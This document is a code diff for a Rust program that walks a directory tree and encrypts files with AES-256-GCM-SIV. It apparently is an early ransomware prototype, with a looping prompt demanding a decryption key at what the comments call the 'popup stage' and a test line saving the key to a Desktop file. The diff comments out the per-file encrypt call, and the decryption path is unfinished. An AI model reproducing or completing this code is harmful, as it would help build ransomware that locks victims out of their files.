@@ -6,6 +6,7 @@ use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
 use crossterm::event::{poll, read, Event, KeyCode};
 use crossterm::terminal::enable_raw_mode;
 use eframe::egui;
+use hex;
 use rand_chacha::rand_core::{RngCore, SeedableRng};
 use rand_chacha::ChaCha20Rng;
 use std::fs::{File, OpenOptions};
@@ -48,29 +49,29 @@ fn main() {
     //TESTCODE: delete later. shows the key so i dont lock myself out
     //create a file called key.txt and write the key to it
     let mut key_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
-    writeln!(key_file.as_ref().unwrap(), "key: {:?}", key);
+    writeln!(key_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
 
-    // loop {
-    //     //TODO: move all of this to a decryption function
-    //     let mut user_input = String::new();
-    //     //FIXME: thisis the popup stage
-    //     println!("Enter decryption key pls: ");
-    //     io::stdin().read_line(&mut user_input).unwrap();
-    //     let user_input_bytes = user_input.as_bytes(); //convert to bytes
+    loop {
+        //TODO: move all of this to a decryption function
+        let mut user_input = String::new();
+        //FIXME: thisis the popup stage
+        println!("Enter decryption key pls: ");
+        io::stdin().read_line(&mut user_input).unwrap();
+        let user_input_bytes = user_input.as_bytes(); //convert to bytes
 
-    //     //TODO: UP TO HERE TODAY
-    //     //key length 32, nonce length 12
-    //     if user_input_bytes.len() != 32 {
-    //         //print error
-    //         println!("Invalid key length");
-    //     } else {
-    //         // //FIXME: convert byte array into key format why this no work
-    //         // //WHY THIS NO WORK
-    //         // let user_key = GenericArray::clone_from_slice(&user_input_bytes[0..32]);
-    //         // //decrypt using the key
-    //         // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
-    //     }
-    // }
+        //TODO: UP TO HERE TODAY
+        //key length 32, nonce length 12
+        if user_input_bytes.len() != 32 {
+            //print error
+            println!("Invalid key length");
+        } else {
+            // //FIXME: convert byte array into key format why this no work
+            // //WHY THIS NO WORK
+            // let user_key = GenericArray::clone_from_slice(&user_input_bytes[0..32]);
+            // //decrypt using the key
+            // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
+        }
+    }
 }
 
 /**
@@ -199,7 +200,7 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
                     //     continue;
                     // }
 
-                    encrypt(entry.path(), cipher);
+                    // encrypt(entry.path(), cipher);
                 } else {
                     decrypt(entry.path(), cipher)?;
                 }
